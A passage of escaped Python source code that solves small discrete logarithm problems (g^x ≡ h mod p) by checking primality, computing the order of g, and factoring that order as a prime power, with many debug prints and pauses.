previous_calc_orders\")\n\t\t\t\tprint(previous_calc_orders.index(g_p_order_to_append))\n\t\t\t\tinput(\"waiting for user..\")\n\n\t\t\telse:\n                #Calculate order\n\t\t\t\t#print(\"g_p_to_append:\",g_p_to_append,\" is NOT in previous_calc_orders\")\n\t\t\t\t#input(\"waiting for user..\")\t\t\t\t\t\n\t\t\t\torder_result = calc_order(g, p, count_nosolns, count_order_not_prime, count_q_e_found, count_q_e_not_found, q_e_nf_order_p_list, primes, n_prime, count_order_prime, previous_calc_g_p)\n\n\t\t\t    #return count_nosolns, count_order_not_prime, count_q_e_found, count_q_e_not_found, q_e_nf_order_p_list, q, e, order_status, n_prime, count_order_prime, order, lhs\n\n\t\t\t\tcount_nosolns = order_result[0]\n\t\t\t\tcount_order_not_prime = order_result[1]\n\t\t\t\tcount_q_e_found = order_result[2]\n\t\t\t\tcount_q_e_not_found = order_result[3]\n\t\t\t\tq_e_nf_order_p_list = order_result[4]\n\t\t\t\tq = order_result[5]\n\t\t\t\te = order_result[6]\n\t\t\t\torder_status = order_result[7]\n\t\t\t\tn_prime = order_result[8]\n\t\t\t\tcount_order_prime = order_result[9]\n\t\t\t\tprint(\"g:\",g,\"p:\",p,\"count_order_prime:\",count_order_prime)\n\t\t\t\torder = order_result[10]\n\t\t\t\tprint(\"g:\",g,\"p:\",p,\"order:\",order)\n\t\t\t\tlhs = order_result[11]\n\t\t\t\tconcat_order_p=str(order)+\"_\"+str(p)\n\n\t\t\t\tg_p_order_to_append=[]\n\t\t\t\tg_p_order_to_append.append(str(g)+\"_\"+str(p))\n\t\t\t\tg_p_order_to_append.append(order)\n\t\t\t\tprevious_calc_orders.append(g_p_order_to_append)\n\t\t\t\t\n\t\t\t\tif str(order)+\"_\"+str(p) in q_e_nf_order_p_list:\n\t\t\t\t    #print(str(order)+\"_\"+str(p),\"is in q_e_nf_order_p_list\")\n\t\t\t\t    #elif concat_g_p in order_false_list:\n\t\t\t\t\tcount_nosolns = count_nosolns + len(range(1, p+1))\n\t\t\t\t    #count_nosolns = count_nosolns + len(h_values)\n\t\t\t\t    #print(\"Previously calculated - \"+str(concat_order_p)+\" is NOT in form q**e !\"\n\t\t\t\t\tx_final = \"No solns!\"\t\t\t\n\t\t\t\t    #print(\"g: \"+str(g)+\", p: \"+str(p)+\", h: \"+str(h)+\", x: \"+str(x_final)+\", no_solns: \"+str(count_nosolns)+\", largerprimelist: \"+str(count_needlargerprimelist)+\", count_q_e_found: \"+str(count_q_e_found)+\", count_q_e_not_found: \"+str(count_q_e_not_found)+\", count_order_prime: \"+str(count_order_prime)+\", count_order_not_prime: \"+str(count_order_not_prime)+\", count_xi_not_found: \"+str(count_xi_not_found)+\", count_calc_xi_status_false: \"+str(count_calc_xi_status_false)\n\t\t\t\telse:\n\t\t\t\t\th_soln_alreadyfound = False\n\t\t\t\t\tfor h in range(1, p+1):\n\t\t\t\t    #for h in h_values:\t\t\t\t\t\t\t\t\n\t\t\t\t    #concat_g_h = str(g)+\"_\"+str(h)\n\t\t\t\t\t    #print(\"-----------------------------------\"\n\t\t\t\t\t    #print(\"g: \"+str(g)+\", p: \"+str(p)+\", h: \"+str(h)\n\t\t\t\t\t\tif h >= p:\n\t\t\t\t\t\t    #print(\"Setting h_soln_alreadyfound to true..\"\n\t\t\t\t\t\t\th_soln_alreadyfound = True\t\t\t\t\t\t\t\n\t\t\t\t\t\t\tbreak\t\t\t\t\t\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\n\t\t\t\t\t\telif g == h:\n\t\t\t\t\t\t\tx_final = 1\n\t\t\t\t\t\t\tx_moduli_final = p - 1\n\t\t\t\t\t\t\tx_to_print = str(x_final)+\" mod \"+str(x_moduli_final)\n\t\n\t\t\t\t\t\t    #Check answers\n\t\t\t\t\t\t\tif pow(g, x_final, p) != h:\n\t\t\t\t\t\t\t\tprint(\"CHECK x_final! g_new: \"+str(g)+\", h: \"+str(h)+\", p: \"+str(p)+\", x_final: \"+str(x_final)+\", x_moduli: \"+str(x_moduli))\n\t\t\t\t\t\t\t\tinput(\"Waiting for user..\")\n\n\t\t\t\t\t\t\telif pow(g, x_final + x_moduli_final, p) != h:\n\t\t\t\t\t\t\t\tprint(\"CHECK x_moduli_final! g: \"+str(g)+\", h: \"+str(h)+\", p: \"+str(p)+\", x_final: \"+str(x_final)+\", x_moduli_final: \"+str(x_moduli_final))\n\t\t\t\t\t\t\t\tinput(\"Waiting for user..\")\n\n\t\t\t\t\t\t\t    #print(\"g: \"+str(g)+\", p: \"+str(p)+\", h: \"+str(h)+\", x: \"+str(x_final)\n\t\t\t\t\t\t\n\t\t\t\t\t\t    #print(\"g: \"+str(g)+\", p: \"+str(p)+\", h: \"+str(h)+\", x: \"+str(x_final)+\", no_solns: \"+str(count_nosolns)+\", largerprimelist: \"+str(count_needlargerprimelist)+\", count_q_e_found: \"+str(count_q_e_found)+\", count_q_e_not_found: \"+str(count_q_e_not_found)+\", count_order_prime: \"+str(count_order_prime)+\", count_order_not_prime: \"+str(count_order_not_prime)+\", count_xi_not_found: \"+str(count_xi_not_found)+\", count_calc_xi_status_false: \"+str(count_calc_xi_status_false)\t\t\t\t\t\t\t\n\t\n\t\t\t\t\t\telse:\t\t\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\tif order_status == True:\n\t\t\t\t\t\t\t    #print(\"q is: \"+str(q)+\", e is: \"+str(e) \n\t\t\t\t\t\t\t    #dlp is:  g**x congruent to h mod p, where g, h and p are known, p prime.\t\n\t\t\t\t\t\t\t    #print('Running dlp()..')\n\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t    #print(\"-----------------------------------\"\n\t\t\t\t\t\t\t    #print(\"count_nosolns before dlp(): \"+str(count_nosolns)\n\n\t\t\t\t\t\t\t\tresult = dlp(g, p, h, count_nosolns, count_x_equals_0, count_normal_soln, count_needlargerprimelist, answers_to_be_checked, count_calc_xi_no_solns, count_notprime, q_e_nf_order_p_list, primes, q, e, n_prime, count_xi_not_found, count_calc_xi_status_false, lhs)\n\n\t\t\t\t\t\t\t    #print(\"return back to h_values loop..\"\t\t\t\t\t\t\t\t\n\n\t\t\t\t\t\t\t\tx_final = result[0]\n\t\t\t\t\t\t\t\tcount_nosolns = result[1]\n\t\t\t\t\t\t\t\tcount_calc_xi_no_solns = result[2]\n\t\t\t\t\t\t\t\tcount_normal_soln = result[3]\n\t\t\t\t\t\t\t\tx_moduli_final = result[4]\n\t\t\t\t\t\t\t\tanswers_to_be_checked.append(result[5])\n\t\t\t\t\t\t\t\tcount_x_equals_0 = result[6]\n\t\t\t\t\t\t\t\tcount_needlargerprimelist = result[7]\n\t\t\t\t\t\t\t\tcount_notprime = result[8]\n\t\t\t\t\t\t\t\tq_e_nf_order_p_list = result[9]\n\t\t\t\t\t\t\t    #order_false_list = result[9]\n\t\t\t\t\t\t\t\tcount_xi_not_found = result[10]\n\t\t\t\t\t\t\t\tcount_calc_xi_status_false = result[11]\n\n\t\t\t\t\t\t\t    #print(\"count_nosolns after dlp(): \"+str(count_nosolns)\n\t\t\t\t\t\t\t    #print(\"x_final is: \"+str(x_final))\n\t\t\t\t\t\t\t    #print(\"x_moduli_final is: \"+str(x_moduli_final)\n\t\t\t\t\t\t\t\tif x_final != \"No solns!\":\t\t\t\t\t\t\n\t\t\t\t\t\t\t\t    #print(\"x_final != No solns!\"\n\t\t\t\t\t\t\t\t    x_to_print = str(x_final)+\" mod \"+str(x_moduli_final)\n\t\t\t\t\t\t\t\t    #input(\"Waiting for user..\")\t\t\t\t\t\t\n\n\t\t\t\t\t\t\t\t    #Check answers\n\t\t\t\t\t\t\t\t    if pow(g, x_final, p) != h:\n\t\t\t\t\t\t\t\t\t    print(\"CHECK x_final! g: \"+str(g)+\", h: \"+str(h)+\", p: \"+str(p)+\", x_final: \"+str(x_final)+\", x_moduli: \"+str(x_moduli))\n\t\t\t\t\t\t\t\t\t    input(\"Waiting for user..\")\n\n\t\t\t\t\t\t\t\t    elif pow(g, x_final + x_moduli_final, p) != h:\n\t\t\t\t\t\t\t\t\t    print(\"CHECK x_moduli_final! g: \"+str(g)+\", h: \"+str(h)+\", p: \"+str(p)+\", x_final: \"+str(x_final)+\", x_moduli_final: \"+str(x_moduli_final))\n\t\t\t\t\t\t\t\t\t    input(\"Waiting for user..\")\n\n\t\t\t\t\t\t\t    #print(\"g: \"+str(g)+\", p: \"+str(p)+\", h: \"+str(h)+\", x: \"+str(x_final)\n\n\t\t\t\t\t\t\telif order_status != False:\n\t\t\t\t\t\t\t\tprint(\"***ERROR!!!*** order_status is: \"+str(order_status))\n\t\t\t\t\t\t\t\tinput(\"Waiting for user..\")\t\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t    #error=True\n\n\n\t\treturn count_nosolns, count_calc_xi_no_solns, count_normal_soln, answers_to_be_checked, count_x_equals_0, count_needlargerprimelist, count_notprime, q_e_nf_order_p_list, count_xi_not_found, count_calc_xi_status_false, previous_calc_orders\n\n\telse:\t\t\t\t\n\t\tprint(\"Order for g:\",g,\",p:\",p,\"does not match criteria - not in previous_calc_g_p!\")\n\n\n\t\treturn count_nosolns, count_calc_xi_no_solns, count_normal_soln, answers_to_be_checked, count_x_equals_0, count_needlargerprimelist, count_notprime, q_e_nf_order_p_list, count_xi_not_found, count_calc_xi_status_false, previous_calc_orders\n\n\ndef ghp_checks(g,h,p,floor_sqrt_p, count_a_notprime):\t\n\t\n\t#print(\"Running ghp_checks()..\"\n\n\t#Assuming p is prime: \t\tBest case: O(sqrt(n)+5)\t\tWorst case: O(sqrt(n)+8)\n\t#Assuming p is not prime: \tO(sqrt(n)+5)\n\n\tstatus=1\n\t\n\t#Simple Checks for g & h:\n\tif (g==0 or h==0):\t\t\t\t#O(1)\n\t\tprint('One or more numbers entered for g, h and p are 0. Please choose numbers that are not 0.')\n\t\tstatus=0\t\t\t\t\t\t\t\t\t\t\t\t#O(1)\n\t\tsys.exit()\t\t\t\t\t\t\t\t\t\t\t\t#O(1)\n\telif g==1:\t\t\t\t\t#O(1)\n\t\tprint('g = 1 has trivial solutions for the dlp. Please choose another number.')\n\t\tstatus=0\t\t\t\t\t\t\t\t\t\t\t\t#O(1)\n\t\tsys.exit()\t\t\t\t\t\t\t\t\t\t\t\t#O(1)\n\telif g<0:\t\t\t\t\t#O(1)\n\t\tprint('Number for g is negative. Please enter another number.')\n\t\tstatus=0\t\t\t\t\t\t\t\t\t\t\t\t#O(1)\n\t\tsys.exit()\t\t\t\t\t\t\t\t\t\t\t\t#O(1)\n\t\n\t#Check if g = p:\n\telif g == p:\n\t\tprint('g = p. x is any integer. Please enter other numbers for g and p.')\n\t\tstatus=0\t\t\t\t\t\t\t\t\t\t\t\t#O(1)\n\t\tsys.exit()\t\t\t\t\t\t\t\t\t\t\t\t#O(1)\n\n\t#Check if h < p:\n\telif h >= p:\n\t\tprint('h is >= p. Please enter other numbers for h and p.')\n\t\tstatus=0\t\t\t\t\t\t\t\t\t\t\t\t#O(1)\n\t\tsys.exit()\t\t\t\t\t\t\t\t\t\t\t\t#O(1)\n\n\t#Need to check if p is prime\n\t#print('Checking if p is prime ..')\n\ta = isprime(p)\t\t\t\t\t#O(sqrt(n))\t\n\t#True for Prime\n\t#False for not prime\t\n\tif a == False:\t\t\t\t\t#O(1)\t#Best case: O(5)\n\t\tprint('The number entered for p: '+str(p)+' is not prime. Please choose a number that is prime for p.')\t\t\n\t\tstatus=0\t\t\t\t\t\t\t\t\t\t\t\t\t#O(1)\n\t\tcount_a_notprime = count_a_notprime + 1\t\t\t\t\t\t\t\t\t\t#O(1)\n\t\tsys.exit()\t\t\t\t\t\t\t\t\t\t\t\t\t#O(1)\n\n\t#return status, a, b, q\n\treturn status, a\n\ndef isprime(p):\t\t\t#this is O(sqrt(n))\n\t\n\t#print(\"Running isprime(\",p,\")\")\n\t\n\t# www.rookieslab.com/posts/fastest-way-to-check-if-a-number-is-prime-or-not\n\tif p==1:\n\t\treturn False\t\n\t\t\n\ti = 2\n\twhile i*i <= p:\n\t\t#print(\"p is: \"+str(p)+\", i is: \"+str(i)\t\t#\"g = 4\" #\"p is: No exponent found, i is: 2\"\n\t\tif p % i == 0:\n\t\t\treturn False\n\t\ti += 1\n\n\treturn True\t\t\n\ndef dlp(g, p, h, count_nosolns, count_x_equals_0, count_normal_soln, count_needlargerprimelist, answers_to_be_checked, count_calc_xi_no_solns, count_notprime, q_e_nf_order_p_list, primes, q, e, n_prime, count_xi_not_found, count_calc_xi_status_false, lhs):\n\n\t#print(\"-------------------------------------------------\"\n\tprint(\"Running dlp(\"+str(g)+\", \"+str(p)+\", \"+str(h)+\"..)\")\n\n\tfloor_sqrt_p = int(math.floor(math.sqrt(p)))\t\t\t#O(3)\n\t#print('floor_sqrt_p is: '+str(floor_sqrt_p))\n\n\t#Run checks on g, h & p\t\n\t#result=ghp_checks(g,h,p,floor_sqrt_p)\n\t#count_notprime = 0\t\t\t\t\t\t#O(1)\n\t\n\tresult=ghp_checks(g, h, p, floor_sqrt_p, count_notprime) \t#Best case: O(sqrt(n)+5) \tWorst case: O(sqrt(n)+8)\n\t#return status, a\n\t#status=0 for problem and 1 for no problem\n\t#a=True for Prime, a=False for not prime\n\t\n\tstatus_ghp = result[0]\n\tstatus_isprime_a = result[1]\n\n\tif status_isprime_a == False:\t\t\t\t\t#O(1)\n\t\tcount_notprime = count_notprime + 1\t\t\t#O(1)\n\t\tprint(str(p),\" is not prime! Exiting..\")\t\n\t\tsys.exit()\t\t\t\t\t\t\t#O(1)\n\telif status_ghp == 0:\t\t\t\t\t\t#O(1)\n\t\tprint(\"At least one of checks for g, h or p failed! Exiting..\")\t\n\t\tsys.exit()\t\t\t\t\t\t\t#O(1)\n\telse:\n\t\t#store result of p and isprime(p) so later we do not need to run isprime(p) again\t\t\t\t\n\t\tn_prime.append(p)\n\t\t\n\t\t#print(\"n_prime is: \"+str(n_prime)\n\n\t\t#check if sqrt_p > largest element in primes\n\t\t#print('checking if square root of p > largest element in primes...')\n\t\tsqrt_p = math.sqrt(p)\t\t\t\t\t#O(1)\n\t\tlargest_prime = primes[-1]\t\t\t\t#O(???)\n\t\tif sqrt_p > largest_prime:\t\t\t\t#O(1)\t#Subtotal: O(4)\n\t\t\tprint('Square root of p - '+str(sqrt_p)+' is greater than largest prime in list - '+str(largest_prime)+'. Consider using a larger prime list. Exiting..')\n\t\t\tcount_needlargerprimelist = count_needlargerprimelist + 1\n\t\t\tsys.exit()\n\t\telse:\t\t\t\t\t\t\t#O(1)\n\t\t\t#initialise lists\t\n\t\t\tx=[]\t\t\n\t\t\tx_moduli=[]\n\t\t\t\t\t\n\t\t\t################################################\n\t\t\t# Prop_234 Algorithm\n\t\t\t\n\t\t\t#print(\"g: \"+str(g)+\", h: \"+str(h)+\", q: \"+str(q)+\", e: \"+str(e)+\", p: \"+str(p)\n\t\t\t#count_xi_not_found, count_calc_xi_status_false\n\t\t\tresult_prop_234 = prop_234(g, h, q, e, p, count_xi_not_found, count_calc_xi_status_false, lhs)\n\t\t\t#result_prop_234 = prop_234(g, h, q, e, p)\n\t\t\t\n\t\t\t#return x, M, calc_xi_status, xi_found, count_xi_not_found, count_calc_xi_status_false\n\t\t\n\t\t\tx_initial = result_prop_234[0]\n\t\t\tmoduli = result_prop_234[1]\n\t\t\tcalc_xi_status = result_prop_234[2]\t\t\t\t#O(1)\t\t\t\t\n\t\t\txi_found = result_prop_234[3]\t\t\t\t\t#O(1)\t\n\t\t\tcount_xi_not_found = result_prop_234[4]\n\t\t\tcount_calc_xi_status_false = result_prop_234[5]\n\n\t\t\t#print(\"calc_xi_status is: \"+str(calc_xi_status)\n\t\t\tif calc_xi_status == True and xi_found == True:\n\t\t\t\t#Calc_xi method found solutions\n\t\t\t\t#print(\"x_initial is: \"+str(x_initial))\n\t\t\t\tx.append(x_initial)\n\t\t\t\t#print(\"x is: \"+str(x[0]))\n\t\t\t\t#print str(x_initial)+\" appended to x\"\n\t\t\t\tif x_initial == 0:\t\t\n\t\t\t\t\t#print(\"x[0] = 0\")\n\t\t\t\t\tcount_x_equals_0 = count_x_equals_0 + 1 \n\t\t\t\t\tx_moduli.append(moduli)\n\t\t\t\t\tif moduli == 0:\n\t\t\t\t\t\tprint(\"x[0]=0 and x_moduli[0] is 0!\")\n\t\t\t\t\t\tinput(\"Waiting for user..\")\n\t\t\t\t\telse:\n\t\t\t\t\t\tcount_normal_soln = count_normal_soln + 1\n\n\t\t\t\t\tif pow(g,x[0],p) != h:\t\t\t#O(1)\n\t\t\t\t\t\t#print(\"CHECK ANSWER!!!\"\n\t\t\t\t\t\tprint(\"CHECK FAILED - g: \"+str(g)+\", h: \"+str(h)+\", p: \"+str(p)+\", x_final: \"+str(x[0])+\", x_moduli: \"+str(x_moduli[0]))\n\t\t\t\t\t\tanswers_to_be_checked.append(\"g: \"+str(g)+\" h: \"+str(h)+\" p: \"+str(p)+\" x: \"+str(x[0]))\t#O(1)\n\t\t\t\t\t\tsys.exit()\n\n\t\t\t\t\treturn x[0], count_nosolns, count_calc_xi_no_solns, count_normal_soln, 0, answers_to_be_checked, count_x_equals_0, count_needlargerprimelist, count_notprime, q_e_nf_order_p_list, count_xi_not_found, count_calc_xi_status_false\n\n\t\t\t\telse:\n\t\t\t\t\t#print(\"x[0] != 0\"\n\t\t\t\t\tx_moduli.append(moduli)\n\t\t\t\t\t#print str(result_prop_234[1])+\" appended to x_moduli\"\n\t\t\t\t\tif moduli == 0:\n\t\t\t\t\t\tprint(\"x[0] != 0 and moduli is 0!\")\n\t\t\t\t\t\tinput(\"Waiting for user..\")\n\t\t\t\t\tcount_normal_soln = count_normal_soln + 1\n\t\t\t\t\tif pow(g,x[0],p) != h:\t\t\t#O(1)\n\t\t\t\t\t\t#print(\"CHECK ANSWER!!!\"\n\t\t\t\t\t\tprint(\"CHECK FAILED - g: \"+str(g)+\", h: \"+str(h)+\", p: \"+str(p)+\", x_final: \"+str(x[0])+\", x_moduli: \"+str(x_moduli[0]))\n\t\t\t\t\t\tanswers_to_be_checked.append(str(g)+\"_\"+str(h)+\"_\"+str(p)+\"_\"+str(x[0]))\t#O(1)\n\t\t\t\t\t\tsys.exit()\n\n\t\t\t\t\treturn x[0], count_nosolns, count_calc_xi_no_solns, count_normal_soln, x_moduli[0], answers_to_be_checked, count_x_equals_0, count_needlargerprimelist, count_notprime, q_e_nf_order_p_list, count_xi_not_found, count_calc_xi_status_false\n\n\t\t\telif xi_found == False:\n\t\t\t\t#input(\"xi_found = False ! \")\n\t\t\t\t#Calc_xi method failed to find solutions - an xi was not found !\n\t\t\t\t#print(\"Calc_xi method failed to find solutions - an xi was not found ! \"\n\t\t\t\t#x.append(0)\n\t\t\t\tx.append(\"No solns!\")\n\t\t\t\tcount_calc_xi_no_solns = count_calc_xi_no_solns + 1\n\t\t\t\tcount_nosolns = count_nosolns + 1\t\t\t\t#O(1)\n\n\t\t\t\treturn x[0], count_nosolns, count_calc_xi_no_solns, count_normal_soln, 0, answers_to_be_checked, count_x_equals_0, count_needlargerprimelist, count_notprime, q_e_nf_order_p_list, count_xi_not_found, count_calc_xi_status_false\n\t\t\telif calc_xi_status == False:\n\t\t\t\t#input(\"calc_xi_status = False ! \")\n\t\t\t\t#Calc_xi method failed to find solutions - lhs=1 and rhs=1\t\n\t\t\t\t#print(\"Calc_xi method failed to find solutions - calc_xi_status is false ! \"\n\t\t\t\tx.append(\"No solns!\")\n\t\t\t\t#x.append(0)\n\t\t\t\tcount_calc_xi_no_solns = count_calc_xi_no_solns + 1\n\t\t\t\tcount_nosolns = count_nosolns + 1\t\t\t\t#O(1)\n\t\t\t\t#sys.exit()\n\n\t\t\t\treturn x[0], count_nosolns, count_calc_xi_no_solns, count_normal_soln, 0, answers_to_be_checked, count_x_equals_0, count_needlargerprimelist, count_notprime, q_e_nf_order_p_list, count_xi_not_found, count_calc_xi_status_false\n\t\t\telse:\n\t\t\t\tprint(\"calc_xi_status is: \"+str(calc_xi_status))\n\t\t\t\tprint(\"xi_found is: \"+str(calc_xi_status))\n\t\t\t\tinput(\"Waiting for user..\")\n\t\t\t\t#sys.exit()\n\n\t\t\t\treturn x[0], count_nosolns, count_calc_xi_no_solns, count_normal_soln, 0, answers_to_be_checked, count_x_equals_0, count_needlargerprimelist, count_notprime, q_e_nf_order_p_list, count_xi_not_found, count_calc_xi_status_false\n\n#def calc_order(g, p, count_nosolns, count_order_not_prime, count_q_e_found, count_q_e_not_found, order_false_list, primes, n_prime, count_order_prime):\n\n#def calc_order(g, p, count_nosolns, count_order_not_prime, count_q_e_found, count_q_e_not_found, q_e_nf_order_p_list, primes, n_prime, count_order_prime):\n\ndef calc_order(g, p, count_nosolns, count_order_not_prime, count_q_e_found, count_q_e_not_found, q_e_nf_order_p_list, primes, n_prime, count_order_prime, previous_calc_g_p):\n\n\tprint(\"Running calc_order(\"+str(g)+\", \"+str(p)+\", ..)\")\n\n\tprint(\"count_order_not_prime:\",count_order_not_prime)\n\tprint(\"count_order_prime:\",count_order_prime)\n\tinput(\"waiting for user..\")\n\t#print(\"previous_calc_g_p:\",previous_calc_g_p)\n\t#print(\"Need to calculate & check order for: \"+str(g)+\"_\"+str(p)\n\t#print(\"Need to calculate & check order for: \"+str(concat_g_p)\t\t\t\t\t\n\n\t#use exponent function to get order of g mod p\n\tresult = exponent_g_p(g, p)\t\t\t\t#Worst: O(n + 7)\t#Best: O(8)\n\t#return x, status\n\t#status is False for \"no exponent found\"\t\n\t#status is True for exponent found\n\tprint(\"Running calc_order(\"+str(g)+\", \"+str(p)+\", ..)\")\n\n\torder = result[0]\t\t\t\t\t#O(1)\n\tstatus = result[1]\t\t\t\t\t#O(1)\n\t#status = result[1]\t\t\t\t\t\n\n\tprint(\"order is:\",str(order))\n\t#input(\"Waiting for user..\")\n\n\t#sqrt_order=math.floor(math.sqrt(order))\n\n\t# Now want order = q**e, where q is prime\n\t# obtain q and e \n\tif status == False:\t\t\t\t\t#O(1)\n\t\tq=0\t\t\t\t\t\t\t#O(1)\n\t\te=0\t\t\t\t\t\t\t#O(1)\n\t\tconcat_order_p = str(order)+\"_\"+str(p)\n\t\tq_e_nf_order_p_list.append(concat_order_p)\t\t#O(1)\n\t\tcount_order_not_prime = count_order_not_prime + 1\t#O(1)\n\t\tcount_q_e_not_found = count_q_e_not_found + 1\t\t#O(1)\n\t\tcount_nosolns = count_nosolns + 1\t\t\t#O(1)\n\t\torder_status = False\n\t\tlhs = 0\n\t\tprint(\"p:\",p,\"order not found!\")\n\t\tinput(\"Waiting for user..\")\n\t\treturn count_nosolns, count_order_not_prime, count_q_e_found, count_q_e_not_found, q_e_nf_order_p_list, q, e, order_status, n_prime, count_order_prime, order, lhs\n\telif order == 1:\t\t\t\t\t#O(1)\n\t\tq = order\t\t\t\t\t\t#O(1)\n\t\te = 1\t\t\t\t\t\t\t#O(1)\n\t\tprint(\"q:\",q,\"e:\",e,\"g:\",g,\"p:\",p,)\n\t\t#input(\"Order is 1! Waiting for user..\")\n\t\t#print(\"order: \"+str(order)\n\t\t#order_false_list.append(str(g)+\"_\"+str(p))\n\t\tconcat_order_p = str(order)+\"_\"+str(p)\n\t\tq_e_nf_order_p_list.append(concat_order_p)\n\t\tcount_order_not_prime = count_order_not_prime + 1\t#O(1)\n\t\tcount_q_e_not_found = count_q_e_not_found + 1\t\t#O(1)\n\t\tcount_nosolns = count_nosolns + 1\t\t\t#O(1)\n\t\t#x_final = \"No solns!\"\n\t\torder_status = False\n\t\t#counts_added = True\n\t\tq = 0\n\t\te = 0\n\t\tlhs = 0\n\t\tprint(\"p:\",p,\"order=1, count_order_not_prime:\",count_order_not_prime)\n\t\tinput(\"Waiting for user..\")\t\t\n\t\treturn count_nosolns, count_order_not_prime, count_q_e_found, count_q_e_not_found, q_e_nf_order_p_list, q, e, order_status, n_prime, count_order_prime, order, lhs\n\telif order in n_prime:\t\t\t\t\n\t\t#print(\"order: \"+str(order)+\" is prime\"\n\t\tq = order\t\t\t\t\t\t#O(1)\n\t\te = 1\t\t\t\t\t\t\t#O(1)\n\t\tcount_order_prime = count_order_prime + 1\t\t#O(1)\n\t\tcount_q_e_found = count_q_e_found + 1\t\t\t#O(1)\n\t\torder_status = True\n\t\tlhs = pow(g,1,p)\n\t\t#counts_added = True\n\t\t#print(\"q: \"+str(q)+\", e: \"+str(e)\n\t\tprint(\"p:\",p,\"order:\",order,\"count_order_prime:\",count_order_prime)\n\t\tinput(\"Waiting for user..\")\n\t\treturn count_nosolns, count_order_not_prime, count_q_e_found, count_q_e_not_found, q_e_nf_order_p_list, q, e, order_status, n_prime, count_order_prime, order, lhs\n\telif isprime(order) == True:\t\t\t\t#O(sqrt(n))\n\t\t#True for prime\n\t\t#False for not prime\n\t\t#order is prime\n\t\t#print(\"order: \"+str(order)+\" is prime\"\n\t\tn_prime.append(order)\n\t\tq = order\t\t\t\t\t\t#O(1)\n\t\te = 1\t\t\t\t\t\t\t#O(1)\n\t\tcount_order_prime = count_order_prime + 1\t\t#O(1)\n\t\torder_status=True\n\t\tcount_q_e_found = count_q_e_found + 1\t\t\t#O(1)\n\t\tlhs = pow(g,1,p)\n\t\t#counts_added = True\n\t\t#print(\"q: \"+str(q)+\", e: \"+str(e)\n\t\tprint(\"p:\",p,\"order:\",order,\"count_order_prime:\",count_order_prime)\n\t\tinput(\"Waiting for user..\")\n\t\treturn count_nosolns, count_order_not_prime, count_q_e_found, count_q_e_not_found, q_e_nf_order_p_list, q, e, order_status, n_prime, count_order_prime, order, lhs\n\n\telse:\n\t\t#print(\"order is: \"+str(order)+\" - not 1 nor prime!\"\n\t\t#input(\"Waiting for user..\")\n\t\t#order is not 1 nor prime\t\t\n\t\tcount_order_not_prime = count_order_not_prime + 1\t#O(1)\n\t\tprint(\"order:\",order,\", count_order_not_prime now:\",count_order_not_prime)\n\n\t\t#now check if order is of form q**e, where q is prime, e>=1. \n\t\t#Need to find q and e.\n\t\t\t\t\t\n\t\tresult = calc_q_e(primes, order, p)\t\t\t#Worst: O(n**2+7n+4)\t#Best: O(12)\n\t\t#return q, e, result\n\n\t\tq=result[0]\t\t\t\t\t\t#O(1)\n\t\te=result[1]\t\t\t\t\t\t#O(1)\n\t\torder_status=result[2]\t\t\t\t\t#O(1)\n\t\t#status=result[2]\t\t\t\t\t\n\t\t#counts_added = False\t\t\t\t\n\t\t#print(\"order_status is: \"+str(order_status)\n\n\t\tif order_status == False:\n\t\t\tconcat_order_p = str(order)+\"_\"+str(p)\n\t\t\tq_e_nf_order_p_list.append(concat_order_p)\n\t\t\t#order_false_list.append(str(g)+\"_\"+str(p))\t\t#O(1)\n\t\t\tcount_q_e_not_found = count_q_e_not_found + 1\t\t#O(1)\n\t\t\tlhs = 0\n\t\t\t#counts_added = True\n\t\telif order_status == True:\n\t\t\tlhs = pow(g,pow(q,e-1),p)\n\t\t\tcount_q_e_found = count_q_e_found + 1\t\t\t#O(1)\n\t\telse:\n\t\t\tprint(\"order_status is: \"+str(order_status))\n\t\t\tlhs = 0\n\t\t\tinput(\"Waiting for user..\")\n\t\t\tconcat_order_p = str(order)+\"_\"+str(p)\n\t\t\tq_e_nf_order_p_list.append(concat_order_p)\n\t\treturn count_nosolns, count_order_not_prime, count_q_e_found, count_q_e_not_found, q_e_nf_order_p_list, q, e, order_status, n_prime, count_order_prime, order, lhs\n\t\t\t\t\t\t\t\ndef calc_q_e(primes, order, p):\n\tprint(\"Running calc_q_e()..\")\t\n\t#print(\"Running calc_q_e(primes, \"+str(k)+\", \"+str(p)+\")..\"\n\n\t#Worst: O(n**2+7n+4)\t#Best: O(12)\n\n\t#q needs to be prime, e >= 1 \n\t#p is prime\t\n\n\tresult=False\t\t\t#O(1)\n\tq=0\t\t\t\t#O(1)\n\te=0\t\t\t\t#O(1)\n\tn=1\t\t\t\t#O(1)\n\t#print(\"p is: \"+str(p)\n\t\n\t#***********\n\t#\"What should be used for calculating q & e - pow(prime,n) or pow(prime,n,p)??\")***********\n\n\tfor prime in primes:\t\t#O(n)\t#Worst: O(n**2+7n)\t#Best: O(8)\n\t\t#print(\"==================\"\n\t\tn = 1\t\t\t\t\t\n\t\t#print(\"n is: \"+str(n)+\", order is: \"+str(k) \t\t\n\t\t#print(\"prime is: \"+str(prime)+\", p is: \"+str(prime)\n\t\twhile result is False and prime < p and n <= order and pow(prime,n) <= order:\t#O(n)\t#Worst: O(n+7)\t#Best: O(7)\n\t\t\t#print(\"-----------------\"\n\t\t\t#print(\"n is: \"+str(n)+\", order is: \"+str(order) \n\t\t\t#print(\"prime is: \"+str(prime)+\", p is: \"+str(p)\n\t\t\t#print(\"prime ** n is: \"+str(prime**n)\n\t\t\tif pow(prime,n) == order:\t\t\t\t\t\t\t#O(2)\n\t\t\t\tq = prime\t\t\t\t\t\t#O(1)\n\t\t\t\te = n\t\t\t\t\t\t\t#O(1)\n\t\t\t\tresult = True\t\t\t\t\t\t#O(1)\n\t\t\t\t#print(\"result is: \"+str(result)\t\t\t\t\n\t\t\t\tbreak\t\t\t\t\t\t\t#O(1)\n\t\t\telse:\n\t\t\t\tn = n + 1\t\t\t\t\t\t#O(1)\n\treturn q, e, result\n\ndef exponent_g_p(g, p):\n\tprint(\"Running exponent_g_p()..\")\n\n\t#Worst: O(n + 7)\t#Best: O(8)\n\n\tn=1\t\t\t\t\t\t#O(1)\n\tx=0\t\t\t\t\t\t#O(1)\n\tstatus=False\t\t\t\t\t#O(1)\n\twhile n < p:\t\t\t\t\t#O(n)\t#Worst: O(n + 7)\n\t\t#print(\"n is:\"+str(n)\n\t\tif pow(g,n,p) == 1:\t\t#O(2)\t#Worst: O(6)\n\t\t\tx = 